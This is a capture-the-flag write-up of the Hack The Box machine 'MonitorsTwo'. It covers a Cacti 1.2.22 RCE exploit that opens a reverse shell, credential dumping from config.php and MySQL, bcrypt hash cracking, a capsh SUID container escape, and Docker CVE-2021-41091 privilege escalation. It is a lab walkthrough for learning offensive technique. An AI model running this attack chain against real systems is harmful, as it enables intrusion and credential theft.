# MonitorsTwo - HTB(Easy)
## IP = 10.129.83.49

### NMAP

```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login to Cacti
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Enumeration

When entering the site you can see that it's using The Cacti Group version 1.2.22 and with a little search on google you can find a rce exploit on this version you can de the following to gain a reverse shell:

```

$ git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22.git
$ cd CVE-2022-46169-CACTI-1.2.22
$ python3 CVE-2022-46169.py -u http://10.129.83.49 --LHOST 10.10.14.57 --LPORT 8888
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!

$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.83.49] 60564
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$

```

### www-data eunmeration

```

www-data@50bca5e748b0:/var/www/html$ cat include/config.php
$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'db';
$database_username = 'root';
$database_password = 'root';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;

www-data@50bca5e748b0:/var/www/html$ mysql -p -u root -h db cacti
MySQL [cacti]> SELECT username, password FROM user_auth;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |
| guest    | 43e9a4ab75570f5b                                             |
| marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |
+----------+--------------------------------------------------------------+

```

Right before cracking those hashes, I looked more in this contained and found a SUID that can give me access to root. Although we don't need it right now maybe it will be handy later:

```

www-data@50bca5e748b0:/var/www/html$ /usr/bin/capsh --gid=0 --uid=0 --
root@50bca5e748b0:/#

```

Now we can try and crack those hashes:

```

> .\hashcat.exe -m 3200 .\hashes\monitorstwo.txt ..\rockyou.txt --username -O
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey

```

### SSH Login

```

$ ssh marcus@monitorstwo.htb
Password: funkymonkey
marcus@monitorstwo:~$ cat user.txt
af6a3576069ad6ad42857d243cb1b3e0

```

### PrivEsc 

After enumerating a little bit I found the following mail:

```

marcus@monitorstwo:~$ cd /var/mail/
marcus@monitorstwo:/var/mail$ cat marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team

```

Interesting, So we got three vulnerabilities we can check on. Im going to start with CVE-2021-41091 because it's the most similar to a privesc and I don't want to play with the kernel if I don't have to.

Let's try the exploit:

#### CVE-2021-41091

First find where the docker container is mounted:
```

marcus@monitorstwo:/var/mail$ findmnt
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/

```

Now we need to use the container we found earlier and upgrade a binary to SUID:
```

root@50bca5e748b0:/# chmod u+s /bin/bash

```

And run the following:
```

marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
bash-5.1# cat /root/root.txt
718fbfac5e9648c3a0f5b189d35c1946

```

And thats the box, pretty fun, actually I strugeld with getting the user, because the hash didn't crack for me, but that was my mistake after that it was a piece of cake. Alright thanks for tuning in Cheers.




